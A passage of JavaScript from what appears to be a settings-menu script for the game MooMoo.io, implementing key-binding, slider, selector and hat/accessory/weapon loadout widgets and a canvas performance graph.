              return k[0].toUpperCase() + k.slice(1).toLowerCase();
            };
            if (kind === "key") {
              el.readOnly = true;
              el.style.cursor = "pointer";
              const startListen = () => {
                if (el._listening) return;
                el._listening = 1;
                AB.Menu.__bindingKey = true;
                const prevRaw = this[idKey] ?? defVal ?? "";
                let timer = 0;
                el.classList.add("key-listen");
                el.value = "...";
                const stop = (restorePrev) => {
                  if (!el._listening) return;
                  el._listening = 0;
                  AB.Menu.__bindingKey = false;
                  clearTimeout(timer);
                  el.classList.remove("key-listen");
                  window.removeEventListener("keydown", onKey, true);
                  document.removeEventListener("keydown", onKey, true);
                  if (restorePrev) this[idKey] = prevRaw;
                  el.value = prettyKey(this[idKey] ?? defVal);
                  el._stopListen = null;
                };
                el._stopListen = stop;
                const onKey = (e) => {
                  try {
                    e.preventDefault();
                  } catch { }
                  try {
                    e.stopPropagation();
                  } catch { }
                  try {
                    e.stopImmediatePropagation();
                  } catch { }
                  const raw = e.key;
                  if (!raw) return;
                  if (raw === "Escape") return stop(true);
                  if (/^F\d{1,2}$/.test(raw)) return;
                  if (
                    raw === "Shift" ||
                    raw === "Control" ||
                    raw === "Alt" ||
                    raw === "Meta"
                  ) {
                    return;
                  }
                  const mods = [];
                  if (e.ctrlKey) mods.push("Ctrl");
                  if (e.altKey) mods.push("Alt");
                  if (e.shiftKey) mods.push("Shift");
                  if (e.metaKey) mods.push("Meta");
                  const combo = (mods.length ? mods.join("+") + "+" : "") + raw;
                  this[idKey] = combo;
                  el.value = prettyKey(combo);
                  log(prettyKey(combo));
                  save();
                  stop(false);
                };
                window.addEventListener("keydown", onKey, true);
                document.addEventListener("keydown", onKey, true);
                timer = setTimeout(() => stop(true), 3000);
              };
              el.addEventListener(
                "click",
                (e) => (e.preventDefault(), startListen()),
              );
              el.addEventListener("mousedown", (e) => {
                if (e.button !== 1) return;
                e.preventDefault();
                if (el._listening && el._stopListen) el._stopListen(false);
                setVal(randKey());
              });
              return;
            }
            if (kind === "number") {
              const getNum = () => {
                const x = +el.value;
                return Number.isNaN(x) ? +defVal || 0 : x;
              };
              const commit = () => setVal(el.value);
              el.addEventListener(
                "wheel",
                (e) => {
                  e.preventDefault();
                  const step = +meta.step || 1,
                    min = meta.min != null ? +meta.min : -Infinity,
                    max = meta.max != null ? +meta.max : Infinity,
                    cur = getNum(),
                    dir = Math.sign(e.deltaY) < 0 ? 1 : -1,
                    next = clamp(cur + dir * step, min, max);
                  if (next === cur) return;
                  setVal(next);
                },
                { passive: false },
              );
              el.addEventListener("mousedown", (e) => {
                if (e.button !== 1) return;
                e.preventDefault();
                const min = meta.min != null ? +meta.min : 0,
                  max = meta.max != null ? +meta.max : min + 100,
                  step = +meta.step || 1,
                  count = Math.floor((max - min) / step) + 1;
                if (count <= 0) return;
                const cur = getNum();
                let r = min + ((Math.random() * count) | 0) * step;
                if (r === cur && count > 1)
                  r =
                    min +
                    (((((r - min) / step) | 0) +
                      1 +
                      ((Math.random() * (count - 1)) | 0)) %
                      count) *
                    step;
                if (r === cur) return;
                setVal(r);
              });
              el.addEventListener("change", commit);
              el.addEventListener("blur", commit);
              return;
            }
            {
              const commit = () => setVal(el.value);
              if (meta.live)
                el.addEventListener("input", () => setVal(el.value, false));
              el.addEventListener("change", commit);
              el.addEventListener("blur", commit);
              el.addEventListener("mousedown", (e) => {
                if (e.button !== 1) return;
                e.preventDefault();
                setVal(buildRandomText(meta.maxLen || 15));
              });
            }
          },
          slider: () => {
            const cfg = Array.isArray(onChange?.[0])
              ? onChange[0]
              : [onChange?.[0], 0, [0, 0], 1],
              [idKey, defVal = 0, range = [0, 0], step = 1] = cfg;
            if (!idKey) return;
            const [min, max] = range,
              dp = (step + "").split(".")[1]?.length || 0;
            this[idKey] ??= defVal;
            const [n, l] = Array.isArray(onChange?.[1])
              ? onChange[1]
              : [onChange?.[1], onChange?.[1]],
              notify = this.Notify(onChange, title),
              log = (v) => notify(v),
              clamp = (v) => Math.min(max, Math.max(min, +v)),
              snap = (v) =>
                +(Math.round((clamp(v) - min) / step) * step + min).toFixed(dp),
              sync = (v) => (
                (v = snap(v)),
                this[idKey] === v ||
                ((this[idKey] = v),
                  (el.value = "" + v),
                  valDisp &&
                  !valDisp._editing &&
                  (valDisp.textContent = "" + v),
                  log(v),
                  save())
              );
            el.min = min;
            el.max = max;
            el.step = step;
            el.value = "" + snap(this[idKey]);
            valDisp &&
              ((valDisp.textContent = "" + el.value),
                (valDisp.style.cursor = "pointer"));
            el.addEventListener("input", () => {
              const v = snap(el.value);
              this[idKey] = v;
              valDisp && !valDisp._editing && (valDisp.textContent = "" + v);
              log(v);
            });
            el.addEventListener("change", () => sync(el.value));
            el.addEventListener(
              "wheel",
              (e) => (
                e.preventDefault(),
                sync(+el.value - Math.sign(e.deltaY) * step)
              ),
              { passive: false },
            );
            el.addEventListener("mousedown", (e) =>
              e.button === 1
                ? (e.preventDefault(),
                  sync(
                    min +
                    ((Math.random() * (Math.floor((max - min) / step) + 1)) |
                      0) *
                    step,
                  ))
                : e.button === 2 && (e.preventDefault(), sync(defVal)),
            );
            if (!valDisp) return;
            const startEdit = () => {
              if (valDisp._editing) return;
              valDisp._editing = 1;
              const prev = "" + snap(this[idKey]),
                input = document.createElement("input");
              input.type = "number";
              input.className = "z-inputbox";
              input.min = min;
              input.max = max;
              input.step = step;
              input.value = prev;
              input.autocomplete = "off";
              input.spellcheck = false;
              input.inputMode = "decimal";
              const stopEvt = (ev) => (
                ev.preventDefault(),
                ev.stopPropagation()
              );
              ["pointerdown", "mousedown", "click"].forEach((t) =>
                input.addEventListener(t, stopEvt, { passive: false }),
              );
              input.addEventListener(
                "wheel",
                (ev) => {
                  ev.preventDefault();
                  ev.stopPropagation();
                  const dir = Math.sign(ev.deltaY) < 0 ? 1 : -1;
                  input.value =
                    "" + snap((+input.value || snap(this[idKey])) + dir * step);
                  sync(input.value);
                },
                { passive: false },
              );
              const apply = () => {
                valDisp._editing = 0;
                try {
                  input.remove();
                } catch { }
                valDisp.textContent = "" + snap(input.value);
                sync(input.value);
              },
                cancel = () => {
                  valDisp._editing = 0;
                  try {
                    input.remove();
                  } catch { }
                  valDisp.textContent = prev;
                },
                outside = (ev) =>
                  ev.target === input ||
                  input.contains(ev.target) ||
                  (document.removeEventListener("pointerdown", outside, true),
                    cancel());
              document.addEventListener("pointerdown", outside, true);
              valDisp.textContent = "";
              valDisp.appendChild(input);
              input.focus();
              input.select();
              input.addEventListener(
                "keydown",
                (ev) => (
                  ev.stopPropagation(),
                  ev.key === "Enter"
                    ? (document.removeEventListener(
                      "pointerdown",
                      outside,
                      true,
                    ),
                      apply())
                    : ev.key === "Escape"
                      ? (document.removeEventListener(
                        "pointerdown",
                        outside,
                        true,
                      ),
                        cancel())
                      : ev.key === "Tab" && ev.preventDefault()
                ),
                true,
              );
              input.addEventListener(
                "blur",
                () => (
                  document.removeEventListener("pointerdown", outside, true),
                  apply()
                ),
                true,
              );
            };
            valDisp.addEventListener(
              "click",
              (e) => (e.preventDefault(), e.stopPropagation(), startEdit()),
            );
            valDisp.addEventListener(
              "wheel",
              (e) => (
                e.preventDefault(),
                e.stopPropagation(),
                sync(+el.value - Math.sign(e.deltaY) * step)
              ),
              { passive: false },
            );
          },
          selector: () => {
            const [idKey, defVal, list = []] = Array.isArray(onChange?.[0])
              ? onChange[0]
              : [onChange?.[0], undefined, []],
              [n, l] = Array.isArray(onChange?.[1])
                ? onChange[1]
                : [onChange[1], onChange[1]],
              wrap = container.querySelector(`#${id}`),
              valueEl = container.querySelector(`#${id}Value`),
              optsCont = container.querySelector(`#${id}Options`);
            if (!wrap || !valueEl || !optsCont) return;
            if (idKey && this[idKey] === undefined) this[idKey] = defVal;
            const opts = [...optsCont.querySelectorAll(".z-select-option")],
              open = (s) => wrap.classList.toggle("open", s),
              sync = (v) => (
                (valueEl.textContent = v),
                opts.forEach((o) =>
                  o.classList.toggle("selected", o.dataset.value === v),
                ),
                idKey && (this[idKey] = v)
              ),
              notify = this.Notify(onChange, title),
              pick = (v) => (sync(v), notify(v), save()),
              step = (d) => {
                if (!opts.length) return;
                let i = opts.findIndex(
                  (o) =>
                    o.dataset.value === (this[idKey] ?? valueEl.textContent),
                );
                if (i < 0)
                  i = opts.findIndex((o) => o.classList.contains("selected"));
                if (i < 0) i = 0;
                pick(opts[(i + d + opts.length) % opts.length].dataset.value);
              },
              rand = () => {
                if (!opts.length) return;
                let cur = opts.findIndex(
                  (o) =>
                    o.dataset.value === (this[idKey] ?? valueEl.textContent),
                );
                if (cur < 0) cur = 0;
                if (opts.length === 1) return pick(opts[0].dataset.value);
                pick(
                  opts[
                    (cur + 1 + ((Math.random() * (opts.length - 1)) | 0)) %
                    opts.length
                  ].dataset.value,
                );
              };
            sync(this[idKey] ?? defVal ?? opts[0]?.dataset.value ?? "");
            valueEl.onclick = (e) => (
              e.stopPropagation(),
              open(!wrap.classList.contains("open"))
            );
            opts.forEach(
              (o) =>
              (o.onclick = (e) => (
                e.stopPropagation(),
                pick(o.dataset.value),
                open(false)
              )),
            );
            document.addEventListener("click", () => open(false));
            valueEl.onwheel = (e) => (
              e.preventDefault(),
              step(Math.sign(e.deltaY) < 0 ? 1 : -1)
            );
            valueEl.onmousedown = (e) => {
              if (e.button === 1) (e.preventDefault(), rand());
            };
            valueEl.oncontextmenu = (e) => {
              e.preventDefault();
              const d = defVal ?? opts[0]?.dataset.value;
              if (this[idKey] === d) return;
              pick(d);
            };
          },
          Loadout: () => {
            const HATS = [
              { id: null, name: "None" },
              { id: 51, name: "Moo Cap" },
              { id: 50, name: "Apple Cap" },
              { id: 28, name: "Moo Head" },
              { id: 29, name: "Pig Head" },
              { id: 30, name: "Fluff Head" },
              { id: 36, name: "Pandou Head" },
              { id: 37, name: "Bear Head" },
              { id: 38, name: "Monkey Head" },
              { id: 44, name: "Polar Head" },
              { id: 35, name: "Fez Hat" },
              { id: 42, name: "Enigma Hat" },
              { id: 43, name: "Blitz Hat" },
              { id: 49, name: "Bob XIII Hat" },
              { id: 57, name: "Pumpkin" },
              { id: 8, name: "Bummle Hat" },
              { id: 2, name: "Straw Hat" },
              { id: 15, name: "Winter Cap" },
              { id: 5, name: "Cowboy Hat" },
              { id: 4, name: "Ranger Hat" },
              { id: 18, name: "Explorer Hat" },
              { id: 31, name: "Flipper Hat" },
              { id: 1, name: "Marksman Cap" },
              { id: 10, name: "Bush Gear" },
              { id: 48, name: "Halo" },
              { id: 6, name: "Soldier Helmet" },
              { id: 23, name: "Anti Venom Gear" },
              { id: 13, name: "Medic Gear" },
              { id: 9, name: "Miners Helmet" },
              { id: 32, name: "Musketeer Hat" },
              { id: 7, name: "Bull Helmet" },
              { id: 22, name: "Emp Helmet" },
              { id: 12, name: "Booster Hat" },
              { id: 26, name: "Barbarian Armor" },
              { id: 21, name: "Plague Mask" },
              { id: 46, name: "Bull Mask" },
              { id: 14, name: "Windmill Hat" },
              { id: 11, name: "Spike Gear" },
              { id: 53, name: "Turret Gear" },
              { id: 20, name: "Samurai Armor" },
              { id: 58, name: "Dark Knight" },
              { id: 27, name: "Scavenger Gear" },
              { id: 40, name: "Tank Gear" },
              { id: 52, name: "Thief Gear" },
              { id: 55, name: "Bloodthirster" },
              { id: 56, name: "Assassin Gear" },
              { id: 1001, name: "Police Hat" },
              { id: 1002, name: "Animal Hat" },
            ],
              ACCS = [
                { id: null, name: "None" },
                { id: 12, name: "Snowball" },
                { id: 9, name: "Tree Cape" },
                { id: 10, name: "Stone Cape" },
                { id: 3, name: "Cookie Cape" },
                { id: 8, name: "Cow Cape" },
                { id: 11, name: "Monkey Tail" },
                { id: 17, name: "Apple Basket" },
                { id: 6, name: "Winter Cape" },
                { id: 4, name: "Skull Cape" },
                { id: 5, name: "Dash Cape" },
                { id: 2, name: "Dragon Cape" },
                { id: 1, name: "Super Cape" },
                { id: 7, name: "Troll Cape" },
                { id: 14, name: "Thorns" },
                { id: 15, name: "Blockades" },
                { id: 20, name: "Devils Tail" },
                { id: 16, name: "Sawblade" },
                { id: 13, name: "Angel Wings" },
                { id: 19, name: "Shadow Wings" },
                { id: 18, name: "Blood Wings" },
                { id: 21, name: "Corrupt X Wings" },
              ],
              WEAPS = [
                { id: null, name: "None", src: null },
                { id: 0, name: "tool hammer", src: "hammer_1" },
                { id: 1, name: "hand axe", src: "axe_1" },
                { id: 2, name: "great axe", src: "great_axe_1" },
                { id: 3, name: "short sword", src: "sword_1" },
                { id: 4, name: "katana", src: "samurai_1" },
                { id: 5, name: "polearm", src: "spear_1" },
                { id: 6, name: "bat", src: "bat_1" },
                { id: 7, name: "daggers", src: "dagger_1" },
                { id: 8, name: "stick", src: "stick_1" },
                { id: 9, name: "hunting bow", src: "bow_1" },
                { id: 10, name: "great hammer", src: "great_hammer_1" },
                { id: 11, name: "wooden shield", src: "shield_1" },
                { id: 12, name: "crossbow", src: "crossbow_1" },
                { id: 13, name: "repeater crossbow", src: "crossbow_2" },
                { id: 14, name: "mc grabby", src: "grab_1" },
                { id: 15, name: "musket", src: "musket_1" },
                { id: 16, name: "shotgun", src: "shotgun_1" },
              ];
            const cfg = Array.isArray(onChange?.[0]) ? onChange[0] : [];
            const idKey = cfg?.[0];
            if (!idKey) return;
            let mode = cfg?.[2];
            if (
              !["hat", "acc", "pri", "sec", "weapPri", "weapSec"].includes(mode)
            ) {
              const s = `${id} ${title}`.toLowerCase();
              mode = s.includes("acc")
                ? "acc"
                : s.includes("weapsec") ||
                  s.includes("sec") ||
                  s.includes("secondary")
                  ? "sec"
                  : s.includes("weappri") ||
                    s.includes("pri") ||
                    s.includes("primary")
                    ? "pri"
                    : "hat";
            }
            mode =
              mode === "weapPri" ? "pri" : mode === "weapSec" ? "sec" : mode;
            const isPri = (w) => w.id == null || (w.id >= 0 && w.id <= 8),
              isSec = (w) => w.id == null || (w.id >= 9 && w.id <= 15),
              list =
                mode === "hat"
                  ? HATS
                  : mode === "acc"
                    ? ACCS
                    : mode === "pri"
                      ? WEAPS.filter(isPri)
                      : WEAPS.filter(isSec),
              hatUrl = (hid) =>
                `http://moomoo.io/img/hats/hat_${hid}${[11, 14, 53].includes(hid) ? "_p" : ""}.png`,
              accUrl = (aid) =>
                `http://moomoo.io/img/accessories/access_${aid}.png`,
              weapUrl = (src) =>
                `https://sandbox.moomoo.io/img/weapons/${src}.png`,
              animal = [28, 29, 30, 36, 37, 38, 44],
              base = (sid, f) =>
                sid === 1001
                  ? f % 2
                    ? 8
                    : 15
                  : sid === 1002
                    ? animal[f % animal.length]
                    : sid,
              getImg = (val, f = 0) =>
                val == null
                  ? ""
                  : mode === "acc"
                    ? accUrl(val)
                    : mode === "pri" || mode === "sec"
                      ? list.find((x) => x.id === val)?.src
                        ? weapUrl(list.find((x) => x.id === val).src)
                        : ""
                      : val === 1001 || val === 1002
                        ? hatUrl(base(val, f))
                        : hatUrl(val),
              fallback =
                cfg?.[1] !== undefined
                  ? cfg[1]
                  : mode === "hat"
                    ? 40
                    : mode === "acc"
                      ? 1
                      : null,
              disp = container.querySelector(`#${id}.z-loadout-display`),
              mini = disp?.querySelector(".z-loadout-mini"),
              nameEl = container.querySelector(`#${id}Name`);
            if (!disp || !mini || !nameEl) return;
            const defW = mode === "pri" ? 0 : mode === "sec" ? 9 : null;
            const initDef =
              fallback !== null && fallback !== undefined ? fallback : defW;
            const notify = this.Notify(onChange, title);
            const find = (v) =>
              list.find((o) => o.id === v) || { name: "Unknown" };
            const hatAnim = (v) => mode === "hat" && (v === 1001 || v === 1002);
            if (this[idKey] === undefined || this[idKey] === "")
              this[idKey] = initDef;
            if (
              (mode === "pri" || mode === "sec") &&
              !list.some((x) => x.id === this[idKey])
            )
              this[idKey] = initDef;
            let modal = null,
              grid = null,
              close = null;
            const stopAnim = () => {
              if (!modal) return;
              if (modal._animTimer) {
                clearInterval(modal._animTimer);
                modal._animTimer = null;
              }
            };
            const syncAnim = () => {
              if (mode !== "hat") return;
              const need =
                (modal && modal.classList.contains("open")) ||
                hatAnim(this[idKey]);
              if (need && !disp._animTimer) {
                disp._animFrame = disp._animFrame || 0;
                disp._animTimer = setInterval(() => {
                  const f = ++disp._animFrame,
                    cur = this[idKey];
                  if (hatAnim(cur)) mini.src = getImg(cur, f);
                }, 220);
              }
              if (!need && disp._animTimer) {
                clearInterval(disp._animTimer);
                disp._animTimer = null;
              }
              if (!modal || mode !== "hat") return;
              const mNeed =
                modal.classList.contains("open") || hatAnim(this[idKey]);
              if (mNeed && !modal._animTimer) {
                modal._animFrame = modal._animFrame || 0;
                modal._animTimer = setInterval(() => {
                  const f = ++modal._animFrame,
                    cur = this[idKey];
                  if (hatAnim(cur)) mini.src = getImg(cur, f);
                  const p =
                    grid &&
                    grid.querySelector(
                      '.z-loadout-card[data-id="1001"] .z-loadout-img',
                    );
                  if (p) p.src = getImg(1001, f);
                  const a =
                    grid &&
                    grid.querySelector(
                      '.z-loadout-card[data-id="1002"] .z-loadout-img',
                    );
                  if (a) a.src = getImg(1002, f);
                }, 220);
              }
              if (!mNeed && modal._animTimer) stopAnim();
            };
            const write = (val, doN = false) => {
              this[idKey] = val;
              const it = find(val);
              nameEl.textContent = it.name || "Unknown";
              const frame = (modal && modal._animFrame) || disp._animFrame || 0;
              const src = getImg(val, frame);
              if (!src) {
                mini.style.display = "none";
                mini.removeAttribute("src");
              } else {
                mini.style.display = "";
                mini.src = src;
              }
              doN && notify(it.name || String(val));
              save();
              syncAnim();
            };
            const buildModal = () => {
              if (modal) return;
              modal = document.createElement("div");
              modal.className = "z-loadout-modal";
              modal.id = `${id}-modal`;
              modal.innerHTML = `<div class="z-loadout-panel"><div class="z-loadout-top"><div class="z-loadout-title">${title || "Loadout"}</div><div class="z-loadout-close" data-close="${id}">&times;</div></div><div class="z-loadout-grid" id="${id}-grid"></div></div>`;
              document.body.appendChild(modal);
              grid = modal.querySelector(`#${id}-grid`);
              close = modal.querySelector(`[data-close="${id}"]`);
              close.onclick = closeModal;
              modal.addEventListener(
                "click",
                (e) => e.target === modal && closeModal(),
              );
            };
            const destroyModal = () => {
              if (!modal) return;
              stopAnim();
              modal.remove();
              modal = grid = close = null;
            };
            const render = () => {
              if (!grid) return;
              const sel = this[idKey];
              const frame = (modal && modal._animFrame) || 0;
              grid.innerHTML = list
                .map(
                  (o) =>
                    `<div class="z-loadout-card ${o.id === sel ? "active" : ""}" data-id="${o.id}">${o.id == null ? "" : `<img class="z-loadout-img" src="${getImg(o.id, frame)}">`}<div class="z-loadout-tag">${o.name}</div></div>`,
                )
                .join("");
              grid.querySelectorAll(".z-loadout-card").forEach(
                (c) =>
                (c.onclick = () => {
                  const raw = c.dataset.id;
                  const v = raw === "null" ? null : +raw;
                  write(v, true);
                  closeModal();
                }),
              );
              syncAnim();
            };
            const openModal = () => {
              buildModal();
              render();
              document.body.style.overflow = "hidden";
              modal.classList.remove("open");
              requestAnimationFrame(() => {
                requestAnimationFrame(() => {
                  modal.classList.add("open");
                  syncAnim();
                });
              });
            };
            const closeModal = () => {
              if (!modal) return;
              document.body.style.overflow = "";
              modal.classList.remove("open");
              const done = (e) => {
                if (e.target !== modal) return;
                modal.removeEventListener("transitionend", done, true);
                destroyModal();
                syncAnim();
              };
              modal.addEventListener("transitionend", done, true);
              setTimeout(() => {
                if (!modal) return;
                modal.removeEventListener("transitionend", done, true);
                destroyModal();
                syncAnim();
              }, 350);
            };
            if (!disp._loadoutBound) {
              disp._loadoutBound = 1;
              disp.onclick = (e) => (e.stopPropagation(), openModal());
              document.addEventListener(
                "keydown",
                (e) =>
                  e.key === "`" &&
                  modal &&
                  modal.classList.contains("open") &&
                  closeModal(),
                true,
              );
            }
            disp._setLoadout = (v) => write(v, false);
            write(this[idKey], false);
            disp.onmousedown = (e) => {
              if (e.button !== 1) return;
              e.preventDefault();
              const cur = this[idKey];
              const n = list.length;
              if (!n) return;
              let i = list.findIndex((x) => x.id === cur);
              if (i < 0) i = 0;
              write(
                list[(i + 1 + ((Math.random() * (n - 1)) | 0)) % n].id,
                true,
              );
            };
            disp.oncontextmenu = (e) => {
              e.preventDefault();
              const def = initDef;
              if (this[idKey] === def) return;
              write(def, true);
            };
            disp.onwheel = (e) => {
              e.preventDefault();
              const n = list.length;
              if (!n) return;
              let i = list.findIndex((x) => x.id === this[idKey]);
              if (i < 0) i = 0;
              i = (i + (e.deltaY < 0 ? 1 : -1) + n) % n;
              write(list[i].id, true);
            };
          },
          SelecBox: () => {
            const cfg0 = Array.isArray(onChange?.[0]) ? onChange[0] : [];
            const defSel = typeof cfg0[0] === "string" ? cfg0[0] : "";
            const pairs = cfg0.filter((x) => Array.isArray(x));
            const chkEl = container.querySelector(`#${id}-chk`);
            const wrap = container.querySelector(`#${id}-sel`);
            const valEl = container.querySelector(`#${id}-selValue`);
            const optEl = container.querySelector(`#${id}-selOptions`);
            const selKey = `__SB_${id}`;
            if (!chkEl || !wrap || !valEl || !optEl) return;
            pairs.forEach(([k, d]) => {
              if (this[k] === undefined) this[k] = !!d;
            });
            const names = pairs.map((p) => p[0]);
            const fallbackSel = defSel || names[0] || "";
            if (this[selKey] === undefined) this[selKey] = fallbackSel;
            if (!names.includes(this[selKey])) this[selKey] = fallbackSel;
            const notify = this.Notify(onChange, title);
            const open = (s) => wrap.classList.toggle("open", s);
            const isOpen = () => wrap.classList.contains("open");
            const opts = () => [...optEl.querySelectorAll(".z-select-option")];
            const getSel = () => String(this[selKey] || "");
            const setChkUI = (v) => {
              v = !!v;
              chkEl.classList.toggle("active", v);
              chkEl.dataset.value = v;
            };
            const syncUI = () => {
              const selected = getSel();
              valEl.textContent = selected;
              setChkUI(!!this[selected]);
              const list = opts();
              list.forEach((o) => {
                const name = o.dataset.value;
                const on = !!this[name];
                o.classList.toggle("is-on", on);
                o.classList.toggle("current", name === selected);
              });
            };
            const setSelected = (name) => {
              this[selKey] = String(name || "");
              if (!names.includes(this[selKey])) this[selKey] = fallbackSel;
              syncUI();
            };
            const pick = (name, doSave = true) => {
              setSelected(name);
              doSave && save();
            };
            const pickRandom = () => {
              const list = opts();
              if (!list.length) return;
              const cur = getSel();
              if (list.length === 1) return pick(list[0].dataset.value);
              let v;
              do v = list[(Math.random() * list.length) | 0].dataset.value;
              while (v === cur);
              pick(v);
            };
            const pickStep = (dir) => {
              const list = opts();
              if (!list.length) return;
              const cur = getSel();
              let idx = list.findIndex((o) => o.dataset.value === cur);
              if (idx < 0) idx = 0;
              idx = (idx + dir + list.length) % list.length;
              pick(list[idx].dataset.value);
            };
            syncUI();
            chkEl.onclick = (e) => {
              e.preventDefault();
              e.stopPropagation();
              const selected = getSel();
              if (!selected) return;
              const next = !chkEl.classList.contains("active");
              this[selected] = next;
              setChkUI(next);
              syncUI();
              notify(!!next, selected);
              save();
            };
            valEl.onclick = (e) => {
              e.preventDefault();
              e.stopPropagation();
              syncUI();
              open(!isOpen());
            };
            wrap.addEventListener(
              "wheel",
              (e) => {
                e.preventDefault();
                e.stopPropagation();
                pickStep(e.deltaY > 0 ? 1 : -1);
              },
              { passive: false },
            );
            valEl.onmousedown = (e) => {
              if (e.button !== 1) return;
              e.preventDefault();
              e.stopPropagation();
              pickRandom();
            };
            valEl.oncontextmenu = (e) => {
              e.preventDefault();
              e.stopPropagation();
              const d = fallbackSel;
              if (d && d !== getSel()) pick(d);
            };
            opts().forEach((o) => {
              o.onclick = (e) => {
                e.preventDefault();
                e.stopPropagation();
                pick(o.dataset.value);
                open(false);
              };
            });
            document.addEventListener("click", (e) => {
              if (!wrap.contains(e.target)) open(false);
            });
          },
          Graph: () => {
            const card = container.querySelector(`#${id}`);
            if (!card) return;
            const self = this;
            const G =
              self.__graph ||
              (self.__graph = (() => {
                const MAX = 240,
                  STEP = 250,
                  graphs = new Map();
                let timer = 0,
                  active = false;
                const clamp = (n, a, b) => Math.min(b, Math.max(a, n));
                const safe = (v) => (Number.isFinite(v) ? v : null);
                const statsOf = (arr) => {
                  let min = Infinity,
                    max = -Infinity,
                    sum = 0,
                    c = 0;
                  for (const v of arr) {
                    if (!Number.isFinite(v)) continue;
                    sum += v;
                    c++;
                    if (v < min) min = v;
                    if (v > max) max = v;
                  }
                  return c
                    ? { avg: sum / c, min, max }
                    : { avg: null, min: null, max: null };
                };
                const draw = (ctx, arr, minY, maxY) => {
                  if (!ctx) return;
                  const cvs = ctx.canvas,
                    w = cvs.width,
                    h = cvs.height;
                  ctx.clearRect(0, 0, w, h);
                  ctx.globalAlpha = 0.22;
                  ctx.fillStyle = "#fff";
                  for (let i = 1; i <= 3; i++) {
                    const y = (h * i) / 4;
                    ctx.fillRect(10, y, w - 20, 1);
                  }
                  ctx.globalAlpha = 1;
                  if (arr.length < 2) return;
                  const pad = 10;
                  const xStep = (w - pad * 2) / (MAX - 1);
                  const yOf = (v) => {
                    const t =
                      (clamp(v, minY, maxY) - minY) / (maxY - minY || 1);
                    return h - pad - t * (h - pad * 2);
                  };
                  ctx.lineWidth = 2;
                  ctx.strokeStyle = "#B987FF";
                  ctx.lineJoin = "round";
                  ctx.lineCap = "round";
                  let x0 = pad,
                    y0 = yOf(arr[0]);
                  ctx.beginPath();
                  ctx.moveTo(x0, y0);
                  for (let i = 1; i < arr.length; i++) {
                    const x1 = pad + i * xStep,
                      y1 = yOf(arr[i]);
                    if (i < arr.length - 1) {
                      const x2 = pad + (i + 1) * xStep,
                        y2 = yOf(arr[i + 1]);
                      ctx.quadraticCurveTo(
                        x1,
                        y1,
                        (x1 + x2) / 2,
                        (y1 + y2) / 2,
                      );
                    } else {
                      ctx.lineTo(x1, y1);
                    }
                    x0 = x1;
                    y0 = y1;
                  }
                  ctx.stroke();
                  ctx.fillStyle = "#fff";
                  ctx.globalAlpha = 0.9;
                  ctx.beginPath();
                  ctx.arc(x0, y0, 3.5, 0, Math.PI * 2);
                  ctx.fill();
                  ctx.globalAlpha = 1;
                };
                const raf = {
                  fps: 0,
                  frames: 0,
                  lastT: performance.now(),
                  started: false,
                };
                const startRaf = () => {
                  if (raf.started) return;
                  raf.started = true;
                  const loop = (t) => {
                    if (active) {
                      raf.frames++;
                      if (t - raf.lastT >= 500) {
                        raf.fps = Math.round(
                          (raf.frames * 1000) / (t - raf.lastT),
                        );
                        raf.frames = 0;
                        raf.lastT = t;
                      }
                    } else {
                      raf.frames = 0;
                      raf.lastT = t;
                    }
                    requestAnimationFrame(loop);
                  };
                  requestAnimationFrame(loop);
                };
                const tick = () => {
                  if (!active || !graphs.size) return;
                  for (const g of graphs.values()) {
                    const nowRaw = safe(+(g.sample ? g.sample() : null));
                    if (nowRaw != null) {
                      const v = Math.max(0, nowRaw);
                      g.raw.push(v);
                      if (g.raw.length > MAX) g.raw.shift();
                      const a = g.alpha;
                      g.ema = g.ema == null ? v : a * v + (1 - a) * g.ema;
                      const sv = Math.max(0, g.ema);
                      g.smooth.push(sv);
                      if (g.smooth.length > MAX) g.smooth.shift();
                    }
                    const S = statsOf(g.raw);
                    if (g.now)
                      g.now.textContent = nowRaw == null ? "--" : g.fmt(nowRaw);
                    if (g.avg)
                      g.avg.textContent =
                        S.avg == null ? "--" : String(Math.round(S.avg));
                    if (g.min)
                      g.min.textContent =
                        S.min == null ? "--" : String(Math.round(S.min));
                    if (g.max)
                      g.max.textContent =
                        S.max == null ? "--" : String(Math.round(S.max));
                    let minY = 0,
                      maxY = 100;
                    if (g.range === "dynamic") {
                      const dyn = Math.max(80, (S.max || 0) + 40);
                      maxY = Math.min(400, dyn);
                    } else {
                      minY = +g.range.min || 0;
                      maxY = +g.range.max || 100;
                    }
                    draw(g.ctx, g.smooth, minY, maxY);
                  }
                };
                const start = () => {
                  if (timer || !active) return;
                  startRaf();
                  timer = setInterval(tick, STEP);
                };
                const stop = () => {
                  if (!timer) return;
                  clearInterval(timer);
                  timer = 0;
                };
                const setActive = (v) => {
                  active = !!v;
                  if (active) start();
                  else stop();
                };
                const sampler = (src) => {
                  if (typeof src === "function") return () => src();
                  if (typeof src === "string") return () => window[src];
                  if (typeof src === "number") return () => src;
                  return () => null;
                };
                const layout = (root) => {
                  if (!root) return;
                  root
                    .querySelectorAll(".z-perf-break")
                    .forEach((x) => x.remove());
                  const COLS = 2;
                  const GAP = 12;
                  const setCols = (el, cols, pos, clearBoth) => {
                    el.style.boxSizing = "border-box";
                    el.style.marginBottom = "12px";
                    el.style.float = "left";
                    el.style.width = `calc((100% - ${(cols - 1) * GAP}px) / ${cols})`;
                    el.style.marginRight = pos === cols - 1 ? "0" : GAP + "px";
                    el.style.clear = clearBoth ? "both" : "none";
                  };
                  const addBreak = (afterEl) => {
                    afterEl.insertAdjacentElement(
                      "afterend",
                      Object.assign(document.createElement("div"), {
                        className: "z-perf-break",
                      }),
                    );
                  };
                  const kids = Array.from(root.children);
                  let run = [];
                  const flush = () => {
                    if (!run.length) return;
                    let i = 0;
                    while (i < run.length) {
                      const left = run.length - i;
                      const colsThisRow = left === 1 ? 1 : Math.min(COLS, left);
                      const clearRow = i === 0;
                      if (colsThisRow === 1) {
                        run[i].style.boxSizing = "border-box";
                        run[i].style.marginBottom = "12px";
                        run[i].style.float = "none";
                        run[i].style.width = "100%";
                        run[i].style.marginRight = "0";
                        run[i].style.clear = clearRow ? "both" : "none";
                        addBreak(run[i]);
                        i += 1;
                        continue;
                      }
                      for (let pos = 0; pos < colsThisRow; pos++) {
                        setCols(
                          run[i + pos],
                          colsThisRow,
                          pos,
                          clearRow && pos === 0,
                        );
                      }
                      addBreak(run[i + colsThisRow - 1]);
                      i += colsThisRow;
                    }
                    run = [];
                  };
                  for (const el of kids) {
                    const isCard =
                      el.classList && el.classList.contains("z-perf-card");
                    if (isCard) run.push(el);
                    else flush();
                  }
                  flush();
                };
                const register = (gid, root, opt) => {
